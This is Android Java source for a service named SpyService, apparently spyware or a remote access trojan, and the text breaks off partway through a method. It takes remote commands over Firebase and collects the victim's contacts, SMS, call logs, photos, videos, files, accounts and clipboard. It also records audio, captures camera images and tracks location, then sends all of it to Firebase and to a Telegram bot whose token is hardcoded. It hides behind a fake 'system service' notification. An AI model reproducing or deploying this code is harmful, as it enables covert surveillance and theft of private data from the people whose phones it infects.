package com.black.phone;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import com.google.firebase.database.*;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import okhttp3.*;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class SpyService extends Service {
    private static final String TAG = "SpyService";
    private ScheduledExecutorService scheduler;
    private PowerManager.WakeLock wakeLock;
    private MediaRecorder recorder;
    private String audioPath;
    private boolean isRecording = false;
    private String deviceId;
    private Camera camera;
    private Camera frontCamera;
    private LocationManager locationManager;
    private LocationListener locationListener;
    private boolean isTrackingLocation = false;
    private boolean foregroundStarted = false;

    // Telegram
    private static final String BOT_TOKEN = "8962511911:AAHYZpdZJVkNif1iF1-3odKTqq2owgDk16M";
    private static final String CHAT_ID = "6793813126";

    // Firebase
    private FirebaseDatabase database;
    private FirebaseStorage storage;
    private StorageReference storageRef;
    private DatabaseReference deviceRef;
    private DatabaseReference commandRef;
    private DatabaseReference dataRef;
    private OkHttpClient httpClient;

    @Override
    public void onCreate() {
        super.onCreate();
        Config.load(this);
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        httpClient = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(60, TimeUnit.SECONDS)
                .writeTimeout(60, TimeUnit.SECONDS)
                .build();

        startForegroundService();

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Spy:lock");
        wakeLock.acquire(10 * 60 * 1000L);

        // Firebase
        FirebaseDatabase.getInstance().setPersistenceEnabled(false);
        database = FirebaseDatabase.getInstance();
        storage = FirebaseStorage.getInstance();
        storageRef = storage.getReference();
        deviceRef = database.getReference("devices").child(deviceId);
        commandRef = database.getReference("commands").child(deviceId);
        dataRef = database.getReference("devices").child(deviceId).child("data");

        registerDevice();
        listenForCommands();

        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(this::sendHeartbeat, 5, 5, TimeUnit.SECONDS);
    }

    private void startForegroundService() {
        if (foregroundStarted) return;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel ch = new NotificationChannel("spy_ch", "خدمة النظام", NotificationManager.IMPORTANCE_LOW);
                getSystemService(NotificationManager.class).createNotificationChannel(ch);
            }
            Notification notification = new NotificationCompat.Builder(this, "spy_ch")
                    .setContentTitle("⚙️ خدمة النظام")
                    .setContentText("جاري التشغيل...")
                    .setSmallIcon(android.R.drawable.ic_menu_manage)
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .setSilent(true)
                    .build();
            startForeground(1337, notification);
            foregroundStarted = true;
        } catch (SecurityException e) { Log.e(TAG, "Foreground failed", e); }
    }

    private void updateNotification(String text) {
        if (foregroundStarted) {
            try {
                Notification notification = new NotificationCompat.Builder(this, "spy_ch")
                        .setContentTitle("⚙️ خدمة النظام")
                        .setContentText(text)
                        .setSmallIcon(android.R.drawable.ic_menu_manage)
                        .setPriority(NotificationCompat.PRIORITY_MIN)
                        .setSilent(true)
                        .build();
                startForeground(1337, notification);
            } catch (Exception e) { Log.e(TAG, "Update notification failed", e); }
        }
    }

    private void registerDevice() {
        try {
            database.getReference("devices").removeValue();
            Map<String, Object> info = new HashMap<>();
            info.put("device_id", deviceId);
            info.put("device_name", Build.MANUFACTURER + " " + Build.MODEL);
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("android", Build.VERSION.RELEASE);
            info.put("sdk", Build.VERSION.SDK_INT);
            info.put("battery", getBatteryLevel());
            info.put("last_seen", System.currentTimeMillis());
            deviceRef.setValue(info);
            updateNotification("✅ تم التسجيل");
            Log.d(TAG, "Registered");
        } catch (Exception e) { Log.e(TAG, "Registration error", e); }
    }

    private void sendHeartbeat() {
        deviceRef.child("last_seen").setValue(System.currentTimeMillis());
    }

    private void listenForCommands() {
        commandRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot dataSnapshot) {
                String command = dataSnapshot.getValue(String.class);
                if (command != null && !command.isEmpty()) {
                    Log.d(TAG, "📩 Command: " + command);
                    executeCommand(command);
                    commandRef.removeValue();
                }
            }
            @Override
            public void onCancelled(DatabaseError error) {
                Log.e(TAG, "Firebase listen error", error.toException());
            }
        });
    }

    // ======================================================================
    // ========== دوال الإرسال (مع Firebase Storage) ==========
    // ======================================================================

    private void sendData(String type, String data) {
        dataRef.child(type).setValue(data);
    }

    private void sendFileToFirebase(File file, String caption) {
        try {
            // ضغط الملف إذا كان صورة
            if (file.getName().endsWith(".jpg") || file.getName().endsWith(".png")) {
                Bitmap bitmap = BitmapFactory.decodeFile(file.getAbsolutePath());
                if (bitmap != null) {
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 60, baos);
                    FileOutputStream fos = new FileOutputStream(file);
                    fos.write(baos.toByteArray());
                    fos.close();
                }
            }

            // رفع الملف إلى Firebase Storage
            String fileName = deviceId + "/" + System.currentTimeMillis() + "_" + file.getName();
            StorageReference fileRef = storageRef.child("files/" + fileName);
            
            UploadTask uploadTask = fileRef.putFile(Uri.fromFile(file));
            uploadTask.addOnSuccessListener(taskSnapshot -> {
                fileRef.getDownloadUrl().addOnSuccessListener(uri -> {
                    String downloadUrl = uri.toString();
                    try {
                        JSONObject json = new JSONObject();
                        json.put("name", file.getName());
                        json.put("url", downloadUrl);
                        json.put("caption", caption);
                        json.put("path", file.getAbsolutePath());
                        sendData("FILE", json.toString());
                        sendTextToTelegram("📎 " + caption + "\n🔗 " + downloadUrl);
                        Log.d(TAG, "📤 أُرسل إلى Firebase Storage: " + file.getName());
                    } catch (Exception e) {
                        Log.e(TAG, "Send file error", e);
                    }
                });
            }).addOnFailureListener(e -> {
                Log.e(TAG, "Upload failed", e);
                sendTextToTelegram("❌ فشل رفع الملف: " + e.getMessage());
            });
        } catch (Exception e) {
            Log.e(TAG, "Send file to Firebase error", e);
        }
    }

    private void sendFileToTelegram(File file, String caption) {
        try {
            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("caption", caption != null ? caption : file.getName())
                    .addFormDataPart("document", file.getName(),
                            RequestBody.create(file, MediaType.parse("application/octet-stream")))
                    .build();
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument")
                    .post(body)
                    .build();
            httpClient.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "Telegram send failed: " + e.getMessage());
                }
                @Override public void onResponse(Call call, Response response) throws IOException {
                    if (response.isSuccessful()) {
                        Log.d(TAG, "📤 أُرسل إلى تيليجرام: " + file.getName());
                    }
                    response.close();
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "Send file to Telegram error", e);
        }
    }

    private void sendTextToTelegram(String text) {
        try {
            JSONObject json = new JSONObject();
            json.put("chat_id", CHAT_ID);
            json.put("text", text);
            json.put("parse_mode", "Markdown");
            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json; charset=utf-8"));
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
                    .post(body)
                    .build();
            httpClient.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response response) throws IOException { response.close(); }
            });
        } catch (Exception e) { Log.e(TAG, "sendText error", e); }
    }

    private void sendLocationToTelegram(double lat, double lng) {
        try {
            String text = "📍 الموقع: https://maps.google.com/maps?q=" + lat + "," + lng;
            JSONObject json = new JSONObject();
            json.put("chat_id", CHAT_ID);
            json.put("text", text);
            json.put("parse_mode", "Markdown");
            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json; charset=utf-8"));
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
                    .post(body)
                    .build();
            httpClient.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response response) throws IOException { response.close(); }
            });
        } catch (Exception e) { Log.e(TAG, "sendLocation error", e); }
    }

    // ======================================================================
    // ========== تنفيذ الأوامر ==========
    // ======================================================================

    private void executeCommand(String cmd) {
        String lower = cmd.toLowerCase().trim();
        Log.d(TAG, "⚡ Executing: " + lower);
        try {
            switch (lower) {
                case "get_contacts": {
                    File f = collectContacts();
                    sendFileToFirebase(f, "📇 جهات الاتصال");
                    sendFileToTelegram(f, "📇 جهات الاتصال");
                    break;
                }
                case "get_sms": {
                    File f = collectSms();
                    sendFileToFirebase(f, "💬 الرسائل النصية");
                    sendFileToTelegram(f, "💬 الرسائل النصية");
                    break;
                }
                case "get_calllogs": {
                    File f = collectCallLogs();
                    sendFileToFirebase(f, "📞 سجل المكالمات");
                    sendFileToTelegram(f, "📞 سجل المكالمات");
                    break;
                }
                case "get_location": {
                    getLocation();
                    break;
                }
                case "start_record": {
                    startRecording();
                    break;
                }
                case "stop_record": {
                    File f = stopRecording();
                    if (f != null) {
                        sendFileToFirebase(f, "🎤 تسجيل صوتي");
                        sendFileToTelegram(f, "🎤 تسجيل صوتي");
                    }
                    break;
                }
                case "get_apps": {
                    File f = collectApps();
                    sendFileToFirebase(f, "📱 التطبيقات");
                    sendFileToTelegram(f, "📱 التطبيقات");
                    break;
                }
                case "get_photos_all":
                case "get_photos": {
                    File f = collectMedia("images", 0);
                    sendFileToFirebase(f, "🖼 الصور");
                    sendFileToTelegram(f, "🖼 الصور");
                    break;
                }
                case "get_photos_5": {
                    File f = collectMedia("images", 5);
                    sendFileToFirebase(f, "🖼 الصور (5)");
                    sendFileToTelegram(f, "🖼 الصور (5)");
                    break;
                }
                case "get_photos_10": {
                    File f = collectMedia("images", 10);
                    sendFileToFirebase(f, "🖼 الصور (10)");
                    sendFileToTelegram(f, "🖼 الصور (10)");
                    break;
                }
                case "get_photos_20": {
                    File f = collectMedia("images", 20);
                    sendFileToFirebase(f, "🖼 الصور (20)");
                    sendFileToTelegram(f, "🖼 الصور (20)");
                    break;
                }
                case "get_photos_30": {
                    File f = collectMedia("images", 30);
                    sendFileToFirebase(f, "🖼 الصور (30)");
                    sendFileToTelegram(f, "🖼 الصور (30)");
                    break;
                }
                case "get_videos_all":
                case "get_videos": {
                    File f = collectMedia("videos", 0);
                    sendFileToFirebase(f, "🎬 الفيديوهات");
                    sendFileToTelegram(f, "🎬 الفيديوهات");
                    break;
                }
                case "get_videos_5": {
                    File f = collectMedia("videos", 5);
                    sendFileToFirebase(f, "🎬 الفيديوهات (5)");
                    sendFileToTelegram(f, "🎬 الفيديوهات (5)");
                    break;
                }
                case "get_videos_10": {
                    File f = collectMedia("videos", 10);
                    sendFileToFirebase(f, "🎬 الفيديوهات (10)");
                    sendFileToTelegram(f, "🎬 الفيديوهات (10)");
                    break;
                }
                case "get_files_all":
                case "get_files": {
                    File f = collectAllFiles();
                    sendFileToFirebase(f, "📦 الملفات");
                    sendFileToTelegram(f, "📦 الملفات");
                    break;
                }
                case "hide_app": {
                    hideApp();
                    break;
                }
                case "show_app": {
                    showApp();
                    break;
                }
                case "fake_notif": {
                    showFakeNotification();
                    break;
                }
                case "take_photo": {
                    takePhotoBack();
                    break;
                }
                case "take_photo_front": {
                    takePhotoFront();
                    break;
                }
                case "flash_on": {
                    flashOn();
                    break;
                }
                case "flash_off": {
                    flashOff();
                    break;
                }
                case "flash_on_front": {
                    flashOnFront();
                    break;
                }
                case "flash_off_front": {
                    flashOffFront();
                    break;
                }
                case "flash_on_back": {
                    flashOnBack();
                    break;
                }
                case "flash_off_back": {
                    flashOffBack();
                    break;
                }
                case "flash_on_both": {
                    flashOnBoth();
                    break;
                }
                case "flash_off_both": {
                    flashOffBoth();
                    break;
                }
                case "get_imei": {
                    getImei();
                    break;
                }
                case "get_phone": {
                    getPhoneNumber();
                    break;
                }
                case "get_sim": {
                    getSimInfo();
                    break;
                }
                case "get_wifi": {
                    getWifiInfo();
                    break;
                }
                case "get_battery": {
                    getBatteryInfo();
                    break;
                }
                case "get_ip": {
                    getPublicIp();
                    break;
                }
                case "lock_device": {
                    lockDevice();
                    break;
                }
                case "reboot": {
                    rebootDevice();
                    break;
                }
                case "shutdown": {
                    shutdownDevice();
                    break;
                }
                case "get_accounts": {
                    File f = getAccounts();
                    sendFileToFirebase(f, "👤 الحسابات");
                    sendFileToTelegram(f, "👤 الحسابات");
                    break;
                }
                case "get_clipboard": {
                    File f = getClipboard();
                    sendFileToFirebase(f, "📋 الحافظة");
                    sendFileToTelegram(f, "📋 الحافظة");
                    break;
                }
                case "get_device": {
                    sendDeviceInfo();
                    break;
                }
                case "get_network": {
                    sendNetworkInfo();
                    break;
                }
                case "start_location_track": {
                    startLocationTracking();
                    break;
                }
                case "stop_location_track": {
                    stopLocationTracking();
                    break;
                }
                case "screenshot": {
                    takeScreenshot();
                    break;
                }
                case "toggle_wifi_on": {
                    toggleWifi(true);
                    break;
                }
                case "toggle_wifi_off": {
                    toggleWifi(false);
                    break;
                }
                case "toggle_data_on": {
                    toggleData(true);
                    break;
                }
                case "toggle_data_off": {
                    toggleData(false);
                    break;
                }
                case "toggle_bluetooth_on": {
                    toggleBluetooth(true);
                    break;
                }
                case "toggle_bluetooth_off": {
                    toggleBluetooth(false);
                    break;
                }
                case "toggle_location_on": {
                    toggleLocation(true);
                    break;
                }
                case "toggle_location_off": {
                    toggleLocation(false);
                    break;
                }
                case "clear_data": {
                    clearAppData();
                    break;
                }
                case "kill_apps": {
                    killAllApps();
                    break;
                }
                case "vibrate": {
                    vibrateDevice();
                    break;
                }
                case "set_volume_max": {
                    setVolumeMax();
                    break;
                }
                case "set_volume_min": {
                    setVolumeMin();
                    break;
                }
                case "open_browser": {
                    openBrowser();
                    break;
                }
                case "add_contact": {
                    addContact();
                    break;
                }
                case "delete_contact": {
                    deleteContact();
                    break;
                }
                case "copy_contacts": {
                    copyContacts();
                    break;
                }
                case "export_contacts": {
                    exportContacts();
                    break;
                }
                case "send_sms": {
                    sendSms();
                    break;
                }
                case "delete_sms": {
                    deleteSms();
                    break;
                }
                case "forward_sms": {
                    forwardSms();
                    break;
                }
                case "make_call": {
                    makeCall();
                    break;
                }
                case "end_call": {
                    endCall();
                    break;
                }
                case "call_history": {
                    callHistory();
                    break;
                }
                default: {
                    sendData("ERROR", "أمر غير معروف: " + cmd);
                    sendTextToTelegram("❌ أمر غير معروف: " + cmd);
                }
            }
        } catch (Exception e) {
            sendData("ERROR", "خطأ: " + e.getMessage());
            sendTextToTelegram("❌ خطأ: " + e.getMessage());
            Log.e(TAG, "Execute error", e);
        }
    }

    // ======================================================================
    // ========== دوال جمع البيانات الأساسية ==========
    // ======================================================================

    private int getBatteryLevel() {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryIntent = registerReceiver(null, ifilter);
            if (batteryIntent != null) {
                int level = batteryIntent.getIntExtra("level", -1);
                int scale = batteryIntent.getIntExtra("scale", -1);
                if (level >= 0 && scale > 0) return (level * 100) / scale;
            }
        } catch (Exception e) { Log.e(TAG, "battery err", e); }
        return -1;
    }
    // ======================================================================
    // ========== دوال جمع البيانات الأساسية ==========
    // ======================================================================

    private File collectContacts() throws Exception {
        File f = new File(getCacheDir(), "contacts.txt");
        FileOutputStream fos = new FileOutputStream(f);
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                fos.write((name + " : " + phone + "\n").getBytes());
            }
            cursor.close();
        }
        fos.close();
        return f;
    }

    private File collectSms() throws Exception {
        File f = new File(getCacheDir(), "sms.txt");
        FileOutputStream fos = new FileOutputStream(f);
        Uri uri = Uri.parse("content://sms/inbox");
        Cursor cursor = getContentResolver().query(uri, null, null, null, "date DESC");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                fos.write(("من: " + address + "\n" + body + "\n---\n").getBytes());
            }
            cursor.close();
        }
        fos.close();
        return f;
    }

    private File collectCallLogs() throws Exception {
        File f = new File(getCacheDir(), "call_log.txt");
        FileOutputStream fos = new FileOutputStream(f);
        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                fos.write(("رقم: " + number + " | الاسم: " + name + " | النوع: " + type + " | المدة: " + duration + "s\n").getBytes());
            }
            cursor.close();
        }
        fos.close();
        return f;
    }

    private File collectApps() throws Exception {
        File f = new File(getCacheDir(), "apps.txt");
        FileOutputStream fos = new FileOutputStream(f);
        PackageManager pm = getPackageManager();
        List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(0);
        for (android.content.pm.PackageInfo pkg : packages) {
            String name = pkg.applicationInfo.loadLabel(pm).toString();
            fos.write((name + " | " + pkg.packageName + "\n").getBytes());
        }
        fos.close();
        return f;
    }

    private File collectAccounts() throws Exception {
        File f = new File(getCacheDir(), "accounts.txt");
        FileOutputStream fos = new FileOutputStream(f);
        android.accounts.AccountManager am = (android.accounts.AccountManager) getSystemService(ACCOUNT_SERVICE);
        android.accounts.Account[] accounts = am.getAccounts();
        for (android.accounts.Account acc : accounts) {
            fos.write((acc.name + " (" + acc.type + ")\n").getBytes());
        }
        fos.close();
        return f;
    }

    private File collectClipboard() throws Exception {
        File f = new File(getCacheDir(), "clipboard.txt");
        FileOutputStream fos = new FileOutputStream(f);
        android.content.ClipboardManager cm = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        String text = cm.getText() != null ? cm.getText().toString() : "فارغ";
        fos.write(text.getBytes());
        fos.close();
        return f;
    }

    // ======================================================================
    // ========== الصور والفيديوهات والملفات (مع تحديد العدد) ==========
    // ======================================================================

    private File collectMedia(String type, int limit) throws Exception {
        File zipFile = new File(getCacheDir(), type + ".zip");
        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
        Uri uri = type.equals("images") ? MediaStore.Images.Media.EXTERNAL_CONTENT_URI :
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {MediaStore.MediaColumns.DATA,
                MediaStore.MediaColumns.DISPLAY_NAME};
        String sortOrder = MediaStore.MediaColumns.DATE_ADDED + " DESC";
        if (limit > 0) {
            sortOrder += " LIMIT " + limit;
        }
        Cursor cursor = getContentResolver().query(uri, projection, null, null, sortOrder);
        if (cursor != null) {
            int count = 0;
            while (cursor.moveToNext() && (limit == 0 || count < limit)) {
                String path = cursor.getString(0);
                String name = cursor.getString(1);
                File file = new File(path);
                if (file.exists() && file.length() < 50 * 1024 * 1024) {
                    java.io.FileInputStream fis = new java.io.FileInputStream(file);
                    ZipEntry ze = new ZipEntry(name);
                    zos.putNextEntry(ze);
                    byte[] buffer = new byte[1024];
                    int len;
                    while ((len = fis.read(buffer)) > 0) zos.write(buffer, 0, len);
                    zos.closeEntry();
                    fis.close();
                    count++;
                }
            }
            cursor.close();
        }
        zos.close();
        return zipFile;
    }

    private File collectAllFiles() throws Exception {
        File zipFile = new File(getCacheDir(), "all_files.zip");
        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
        File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
        if (dcim.exists()) addDirToZip(zos, dcim, "DCIM");
        File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        if (download.exists()) addDirToZip(zos, download, "Downloads");
        zos.close();
        return zipFile;
    }

    private void addDirToZip(ZipOutputStream zos, File dir, String parent) throws Exception {
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isFile() && f.length() < 20 * 1024 * 1024) {
                java.io.FileInputStream fis = new java.io.FileInputStream(f);
                ZipEntry ze = new ZipEntry(parent + "/" + f.getName());
                zos.putNextEntry(ze);
                byte[] buffer = new byte[1024];
                int len;
                while ((len = fis.read(buffer)) > 0) zos.write(buffer, 0, len);
                zos.closeEntry();
                fis.close();
            }
        }
    }
    // ======================================================================
    // ========== الموقع والتسجيل الصوتي ==========
    // ======================================================================

    private void getLocation() {
        try {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION)
                    != PackageManager.PERMISSION_GRANTED) {
                sendData("ERROR", "صلاحية الموقع غير مفعلة");
                sendTextToTelegram("❌ صلاحية الموقع غير مفعلة");
                return;
            }
            Location loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                String data = loc.getLatitude() + "," + loc.getLongitude();
                sendData("LOCATION", data);
                sendLocationToTelegram(loc.getLatitude(), loc.getLongitude());
            } else {
                locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, new LocationListener() {
                    @Override public void onLocationChanged(Location l) {
                        String data = l.getLatitude() + "," + l.getLongitude();
                        sendData("LOCATION", data);
                        sendLocationToTelegram(l.getLatitude(), l.getLongitude());
                    }
                    @Override public void onStatusChanged(String p, int s, Bundle b) {}
                    @Override public void onProviderEnabled(String p) {}
                    @Override public void onProviderDisabled(String p) {}
                }, Looper.getMainLooper());
            }
        } catch (SecurityException e) {
            sendData("ERROR", "صلاحية الموقع غير مفعلة");
            sendTextToTelegram("❌ صلاحية الموقع غير مفعلة");
        }
    }

    private void startRecording() {
        try {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO)
                    != PackageManager.PERMISSION_GRANTED) {
                sendData("ERROR", "صلاحية التسجيل غير مفعلة");
                sendTextToTelegram("❌ صلاحية التسجيل غير مفعلة");
                return;
            }
            audioPath = getCacheDir() + "/recording_" + System.currentTimeMillis() + ".mp3";
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioSamplingRate(44100);
            recorder.setAudioEncodingBitRate(128000);
            recorder.setOutputFile(audioPath);
            recorder.prepare();
            recorder.start();
            isRecording = true;
            sendData("RECORD", "started");
            sendTextToTelegram("🎤 بدأ التسجيل الصوتي...");
        } catch (Exception e) {
            sendData("ERROR", "فشل التسجيل: " + e.getMessage());
            sendTextToTelegram("❌ فشل التسجيل: " + e.getMessage());
        }
    }

    private File stopRecording() {
        if (isRecording && recorder != null) {
            try {
                recorder.stop();
                recorder.release();
                recorder = null;
                isRecording = false;
                File f = new File(audioPath);
                if (f.exists()) {
                    sendTextToTelegram("⏹ تم إيقاف التسجيل وإرسال الملف");
                    return f;
                }
            } catch (Exception e) {
                sendData("ERROR", "فشل إيقاف التسجيل: " + e.getMessage());
                sendTextToTelegram("❌ فشل إيقاف التسجيل: " + e.getMessage());
            }
        }
        return null;
    }

    // ======================================================================
    // ========== الكاميرا (مع التحقق من الصلاحيات) ==========
    // ======================================================================

    private void takePhotoBack() {
        try {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA)
                    != PackageManager.PERMISSION_GRANTED) {
                sendData("ERROR", "صلاحية الكاميرا غير مفعلة");
                sendTextToTelegram("❌ صلاحية الكاميرا غير مفعلة");
                return;
            }
            Camera cam = Camera.open();
            Camera.Parameters params = cam.getParameters();
            params.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
            cam.setParameters(params);
            cam.takePicture(null, null, (data, camera1) -> {
                try {
                    File file = new File(getCacheDir(), "photo_" + System.currentTimeMillis() + ".jpg");
                    FileOutputStream fos = new FileOutputStream(file);
                    fos.write(data);
                    fos.close();
                    sendFileToFirebase(file, "📸 صورة من الكاميرا الخلفية");
                    sendFileToTelegram(file, "📸 صورة من الكاميرا الخلفية");
                    cam.release();
                } catch (Exception e) {
                    Log.e(TAG, "photo err", e);
                    sendTextToTelegram("❌ فشل حفظ الصورة: " + e.getMessage());
                }
            });
        } catch (Exception e) {
            sendData("ERROR", "فشل التصوير الخلفي: " + e.getMessage());
            sendTextToTelegram("❌ فشل التصوير الخلفي: " + e.getMessage());
        }
    }

    private void takePhotoFront() {
        try {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA)
                    != PackageManager.PERMISSION_GRANTED) {
                sendData("ERROR", "صلاحية الكاميرا غير مفعلة");
                sendTextToTelegram("❌ صلاحية الكاميرا غير مفعلة");
                return;
            }
            Camera cam = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
            cam.takePicture(null, null, (data, camera1) -> {
                try {
                    File file = new File(getCacheDir(), "selfie_" + System.currentTimeMillis() + ".jpg");
                    FileOutputStream fos = new FileOutputStream(file);
                    fos.write(data);
                    fos.close();
                    sendFileToFirebase(file, "🤳 صورة سيلفي");
                    sendFileToTelegram(file, "🤳 صورة سيلفي");
                    cam.release();
                } catch (Exception e) {
                    Log.e(TAG, "selfie err", e);
                    sendTextToTelegram("❌ فشل حفظ الصورة: " + e.getMessage());
                }
            });
        } catch (Exception e) {
            sendData("ERROR", "فشل التصوير الأمامي: " + e.getMessage());
            sendTextToTelegram("❌ فشل التصوير الأمامي: " + e.getMessage());
        }
    }

    // ======================================================================
    // ========== الفلاش (جميع الخيارات) ==========
    // ======================================================================

    // الفلاش الخلفي
    private void flashOnBack() {
        try {
            if (camera == null) {
                camera = Camera.open();
            }
            Camera.Parameters params = camera.getParameters();
            params.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
            camera.setParameters(params);
            camera.startPreview();
            sendData("FLASH", "back_on");
            sendTextToTelegram("🔦 تم تشغيل الفلاش الخلفي");
        } catch (Exception e) {
            sendData("ERROR", "فشل تشغيل الفلاش الخلفي: " + e.getMessage());
            sendTextToTelegram("❌ فشل تشغيل الفلاش الخلفي");
        }
    }

    private void flashOffBack() {
        try {
            if (camera != null) {
                camera.stopPreview();
                camera.release();
                camera = null;
                sendData("FLASH", "back_off");
                sendTextToTelegram("🔦 تم إطفاء الفلاش الخلفي");
            } else {
                sendTextToTelegram("⚠️ الفلاش الخلفي ليس قيد التشغيل");
            }
        } catch (Exception e) {
            sendData("ERROR", "فشل إطفاء الفلاش الخلفي: " + e.getMessage());
            sendTextToTelegram("❌ فشل إطفاء الفلاش الخلفي");
        }
    }

    // الفلاش الأمامي (بعض الهواتف لا تدعمه)
    private void flashOnFront() {
        try {
            if (frontCamera == null) {
                frontCamera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
            }
            Camera.Parameters params = frontCamera.getParameters();
            params.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
            frontCamera.setParameters(params);
            frontCamera.startPreview();
            sendData("FLASH", "front_on");
            sendTextToTelegram("🔦 تم تشغيل الفلاش الأمامي");
        } catch (Exception e) {
            sendData("ERROR", "فشل تشغيل الفلاش الأمامي: " + e.getMessage());
            sendTextToTelegram("❌ فشل تشغيل الفلاش الأمامي (قد لا يكون مدعوماً)");
        }
    }

    private void flashOffFront() {
        try {
            if (frontCamera != null) {
                frontCamera.stopPreview();
                frontCamera.release();
                frontCamera = null;
                sendData("FLASH", "front_off");
                sendTextToTelegram("🔦 تم إطفاء الفلاش الأمامي");
            } else {
                sendTextToTelegram("⚠️ الفلاش الأمامي ليس قيد التشغيل");
            }
        } catch (Exception e) {
            sendData("ERROR", "فشل إطفاء الفلاش الأمامي: " + e.getMessage());
            sendTextToTelegram("❌ فشل إطفاء الفلاش الأمامي");
        }
    }

    private void flashOnBoth() {
        try {
            // تشغيل الخلفي
            if (camera == null) {
                camera = Camera.open();
            }
